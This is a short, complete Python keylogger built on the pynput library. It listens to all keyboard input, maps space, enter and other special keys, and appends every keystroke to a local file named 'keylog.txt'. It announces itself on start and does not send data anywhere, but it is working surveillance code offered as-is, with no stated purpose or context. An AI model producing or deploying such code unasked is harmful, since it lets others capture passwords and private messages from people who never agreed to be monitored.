from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log:
            log.write(key.char)
    except AttributeError:
        # Handle special keys
        with open(LOG_FILE, "a") as log:
            if key == keyboard.Key.space:
                log.write(" ")
            elif key == keyboard.Key.enter:
                log.write("\n")
            else:
                log.write(f"[{key.name}]")

def on_release(key):
    # Stop listener if needed (optional)
    # if key == keyboard.Key.esc:
    #     return False
    pass

def main():
    print(f"Starting keylogger. Keystrokes will be saved to {LOG_FILE}")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
